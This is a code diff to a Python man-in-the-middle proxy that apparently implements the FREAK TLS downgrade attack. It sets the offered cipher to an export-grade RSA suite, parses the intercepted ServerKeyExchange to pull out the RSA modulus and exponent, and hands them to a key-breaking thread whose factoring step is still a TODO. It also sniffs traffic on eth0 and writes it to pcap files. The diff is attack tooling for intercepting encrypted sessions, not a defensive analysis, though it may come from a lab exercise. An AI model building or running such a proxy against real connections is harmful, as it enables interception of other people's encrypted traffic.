@@ -19,7 +19,8 @@ if not logger.hasHandlers():
     logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
 
 
-ORIGINAL_CIPHER = 47
+ORIGINAL_CIPHER = 0x0009
+broken_keys = {} # Map of n -> (e, d, p, q) for broken RSA keys
 
 def parse_and_modify_clienthello(data):
     # Parse the TLS record
@@ -60,8 +61,29 @@ def parse_serverhello(data):
 def parse_serverkeyexchange(data):
     # Parse the TLS record
     logger.info("Parsing intercepted server key exchange data")
-    # ske = TLSServerKeyExchange(data)
-    # TODO
+    # first byte is handshake type
+    # next three bytes are length
+    # bytes 4-5 are modulus length
+    modulus_len = int.from_bytes(data[4:6], 'big')
+    #next modulus_len bytes are modulus
+    modulus = data[6:6+modulus_len]
+    # next two bytes are exponent length
+    exp_len = int.from_bytes(data[6+modulus_len:8+modulus_len], 'big')
+    # next exp_len bytes are exponent
+    public_exponent = data[8+modulus_len:8+modulus_len+exp_len]
+
+    logger.info(f"ServerKeyExchange modulus_len={modulus_len} exponent_len={exp_len} modulus={modulus.hex()} public_exponent={public_exponent.hex()}")
+
+    n = int.from_bytes(modulus, 'big')
+    public_e = int.from_bytes(public_exponent, 'big')
+
+    threading.Thread(target=break_rsa, args=(n, public_e)).start()
+
+def break_rsa(n, e):
+    global broken_keys
+    d, p, q = None, None, None     #TODO call math
+
+    broken_keys[n] = {'e': e, 'd': d, 'p': p, 'q': q}
 
 def recv_exact(sock, n):
     """Read exactly n bytes from a socket or return None if EOF."""
@@ -342,7 +364,6 @@ def forward(src, dst, direction):
                         chosen = parse_sslv2_serverhello(payload)
                         logger.info(f"  SSLv2 ServerHello chosen: {chosen}")
 
-            # For now, forward the record unchanged 
             dst.sendall(hdr + payload)
     except Exception as e:
         logger.warning(f"Exception in forwarding ({direction}): {e}")
@@ -360,14 +381,27 @@ def handle_client(client_sock, client_addr):
         logger.error(f"Error handling client {client_addr}: {e}")
         client_sock.close()
 
+packets = []
+def packet_callback(pkt):
+    packets.append(pkt)
+
 def main():
     listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     listen_sock.bind((LISTEN_HOST, LISTEN_PORT))
     listen_sock.listen(5)
     logger.info(f"Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {SERVER_HOST}:{SERVER_PORT}")
+    sniffer = threading.Thread(target=sniff, kwargs={
+    'iface': 'eth0',
+    'prn': packet_callback,
+    'store': False
+    })
+    sniffer.start()
     while True:
         client_sock, addr = listen_sock.accept()
+        if packets:
+            wrpcap(f"/pcap/freak_mitm_{int(time.time())}.pcap", packets)
+            packets.clear()
         logger.info(f"Accepted connection from {addr}")
         threading.Thread(target=handle_client, args=(client_sock, addr)).start()
 
